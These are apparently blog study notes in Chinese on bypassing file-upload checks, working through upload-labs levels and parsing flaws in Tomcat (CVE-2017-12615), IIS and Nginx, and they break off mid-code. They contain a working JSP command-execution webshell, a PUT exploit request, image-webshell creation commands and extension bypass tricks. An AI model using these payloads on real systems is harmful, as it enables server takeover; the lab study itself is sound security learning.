E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 图片一句话制作方法：1copy 1.png /b + shell.php /a webshell.jpg 图片马文件头检测图片马需要利用文件包含来执行一句话，单纯的上传图片马是不可以执行的，和正常图片没什么区别 1http://127.0.0.1/upload-labs/Pass-13/index.php 检测函数 1234567891011121314151617181920212223242526272829303132333435363738394041function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节，获取文件类型 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;//将前面判断的文件类型拼接 if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;上传失败&quot;; &#125; &#125;&#125; 绕过 这里只需要伪造一个文件头是图片格式就可以绕过，但是最后拼接的时候是根据判断拼接的，所以还是需要配合文件包含才可以执行shell。当然这里上传图片马也可以。 getimagesize函数绕过getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。函数成功返回的就是一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 1http://127.0.0.1/upload-labs/Pass-14/index.php 检测代码 1234567891011121314151617181920212223242526272829303132function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;上传失败&quot;; &#125; &#125;&#125; 绕过方法该函数会返回图片的信息，所有如果不上传图片马是绕不过去的。 绕过 exif_imagetype函数绕过1http://127.0.0.1/upload-labs/Pass-15/index.php 检测代码 123456789101112131415161718192021222324252627282930313233343536function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;上传失败&quot;; &#125; &#125;&#125; exif_imagetype — 判断一个图像的类型并且会判断他的签名 绕过方法通过上传图片马绕过 二次渲染原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 检测代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=$UPLOAD_ADDR.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;该文件不是jpg格式的图片！&quot;; &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagejpeg($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传失败！&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;该文件不是png格式的图片！&quot;; &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagepng($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传失败！&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagegif($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传失败！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; 上传gif将&lt;?php phpinfo(); ?&gt;添加到111.gif的尾部. 成功上传含有一句话的111.gif,但是这并没有成功.我们将上传的图片下载到本地. 可以看到下载下来的文件名已经变化,所以这是经过二次渲染的图片.我们使用16进制编辑器将其打开. 可以发现,我们在gif末端添加的php代码已经被去除. 关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了. 经过对比,蓝色部分是没有发生变化的, 我们将代码写到该位置. 上传后在下载到本地使用16进制编辑器打开 可以看到php代码没有被去除.成功上传图片马。 参考连接1https://xz.aliyun.com/t/2657#toc-13 条件竞争12http://127.0.0.1/upload-labs/Pass-17/index.phphttp://127.0.0.1/upload-labs/Pass-18/index.php 检测代码123456789101112131415161718192021222324$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); unlink($upload_file); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传失败！&#x27;; &#125;&#125; 这里是将文件先上传到服务器，再去比较是否符合条件，如果符合就重命名，不符合就删除掉，所以可以用条件竞争，一直给服务器发送数据包，就可以在他删除之前访问到 绕过方法通过不停的给服务器发包，上传webshell，让他来不及删除，就可以访问了。 目录命名-x.php/.1http://127.0.0.1/upload-labs/Pass-19/index.php 检测代码这关文件名可以自己定义，但是有过滤，但是文件名最后会和路径进行拼接，我们可以通过%00绕过，也可以通过x.php/.的方式绕过，这种方式在代码中相当于x.php是目录，点是文件名，最后检测的后缀是php/.但是在windows中x.php/.又会被当作是文件名。所以最后又变成了x.php 123456789101112131415161718192021222324is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;上传失败！&#x27;; &#125; &#125;else&#123; $msg = &#x27;禁止保存为该类型文件！&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过%00截断 目录方式绕过 脚本函数漏洞-CVE-2015-2348 数组接受+目录命名检测代码123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //检查MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; 绕过关键点在于以下代码： 123if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; 如果$file不是数组，就会以.分割被弄成数组,假如图片名为xx.jpg,那么数组就是 1$file=[&#x27;xx&#x27;,&#x27;.&#x27;,&#x27;jpg&#x27;] 如果我们这样构造: 那么执行这个的时候$file就会等于$_POST[&#39;save_name&#39;]，此时$file就是数组了。 1$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; 而取后缀就会去到数组的最后一个，也就是jpg，然后就绕过了检测 1$ext = end($file); 最后拼接名字的时候就是aaaaa.php/了，所有最后文件就是aaaaa.php/ 1$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; CVE-2017-12615-上传-Tomcat基本信息 漏洞名称：Tomcat任意文件上传漏洞 漏洞编号：CVE-2017-12615 漏洞影响：上传包含任意代码的文件，并被服务器执行。 影响平台：Windows 影响版本：Apache Tomcat 7.0.0 - 7.0.81 测试过程开启HTTP PUT 修改Tomcat 7.0/conf/web.xml文件 1234567891011121314151617181920漏洞本质Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件：​```&lt;servlet&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; //这里 &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; 当然因为是用vulhub搭建的，所有开启环境的时候已经修改过了。 漏洞复现这里需要将shell字符串改为jsp后门 1234567891011121314直接发送以下数据包即可在Web根目录写入shell：​```PUT /1.jsp/ HTTP/1.1Host: your-ip:8080Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 5shell​``` 我这里修改的是shell是 密码是023，通过i进行传参 请求：http://192.168.47.156:8080/1.jsp?pwd=023&amp;i=ls 123456789101112&lt;% if ( &quot;023&quot; .equals(request.getParameter( &quot;pwd&quot; )))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter( &quot;i&quot; )).getInputStream(); int a = - 1 ; byte [] b = new byte [ 2048 ]; out.print( &quot;&lt;pre&gt;&quot; ); while ((a=in.read(b))!=- 1 )&#123; out.println( new String(b)); &#125; out.print( &quot;&lt;/pre&gt;&quot; ); &#125;%&gt; 参考链接12https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5https://www.6b8.me/index.php?m=home&amp;c=article&amp;a=index&amp;id=376 中间件解析漏洞+配合文件上传测试 IIS-上传-解析(IIS5.x–6.x)如果是以image.asp/qq.jpg上传那么image.asp目录下不管是什么文件都会被就会被当做asp解析，例如这里的qq.jpg，就会被当做asp被解析。如果文件是以image.asp:jpg或xxx.aspx;xxjpg命名被上传，那么此文件会被当做asp执行 注:asp可以换做php如果换了php那么就当php执行 Nginx-上传-解析这一漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于“security.limit_extensions”的引入，使得该漏洞难以被成功利用。 php.ini文件中cgi.fix_pathinfo的值默认为1，会导致解析漏洞 还有一个是空字节代码执行漏洞 1xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞) IIS7.5-上传-解析IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。 php.ini里默认cgi.fix_pathinfo=1，对其进行访问的时候，在URL路径后添加.php后缀名会当做php文件进行解析，漏洞由此产生 参考链接1https://www.cnblogs.com/1996-11-01-614lb/p/14237744.html","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"21WEB漏洞--文件上传之后端黑白名单绕过","slug":"21WEB漏洞-文件上传之后端黑白名单绕过","date":"2021-09-21T02:31:00.000Z","updated":"2021-09-21T06:01:46.699Z","comments":true,"path":"2021/09/21/21WEB漏洞-文件上传之后端黑白名单绕过/","link":"","permalink":"https://al0nez.github.io/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 文件上传常见验证:后缀名验证黑名单检测原理 文件类型根据黑名单来检测的原理就是：服务器程序根据一份文件后缀名的名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和这个黑名单里面的类型匹配，那么就禁止该文件上传 明确不让上传的格式后缀 1asp php jsp aspx cgi war 等等 白名单检测原理 明确可以上传的后缀格式，就是说只允许上传明确标注的格式，其他格式不允许上传 1jpg png zip rar gif 等等 文件类型验证检测原理 当用户上传文件到服务器端的时候，服务器端的程序会获取上传文件的MIME类型，然后用这个获取到的类型来和期望的MIME类型进行匹配，如果匹配不上则说明上传的文件不合法。 文件头验证检测原理 文件头检查是指当浏览器上传到服务器的时候，会对文件头检测，符合，则允许上传，否则不允许上传。 绕过方法 通过将文件头修改为GIF89a0等一些图片头部的形式进行绕过 文件类型绕过(以upload靶场为例)文件类型检测(MIME)1http://127.0.0.1/upload-labs/Pass-02/index.php 本关会检测文件类型是不是图片格式，满足才会通过 123456789101112131415161718$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;文件类型不正确，请重新上传！&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.&#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过方法因为服务端检测的是文件的MIME类型，而对这个MIME类型的的值的获取是通过HTTP请求字段里的Content-Type字段，所以绕过的方法就是通过修改Content-Type的值，比如修改为image/jpeg；image/png；image/gif等等允许上传类型对应的MIME值。 黑名单绕过文件名后缀绕过1http://127.0.0.1/upload-labs/Pass-03/index.php 检测代码 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR. &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR .&#x27;/&#x27;. $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过 用像php3，php5这样的文件名绕过检测，而php会当作php文件执行 .htaccess文件绕过（只支持apache）1http://127.0.0.1/upload-labs/Pass-04/index.php .htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。 .htaccess文件内容： xxx为要将此后缀的文件解析为php文件 123&lt;FilesMatch &quot;xxx&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 检测代码 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传!&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过 大小写绕过1http://127.0.0.1/upload-labs/Pass-05/index.php 检测代码 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过 空格绕过1http://127.0.0.1/upload-labs/Pass-06/index.php 通过抓包在文件名后加入空格绕过，windows中如果最后是空格，windows会强行将空格去除。 检测代码 1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过 点绕过1http://127.0.0.1/upload-labs/Pass-07/index.php 没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过 检测代码 1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = 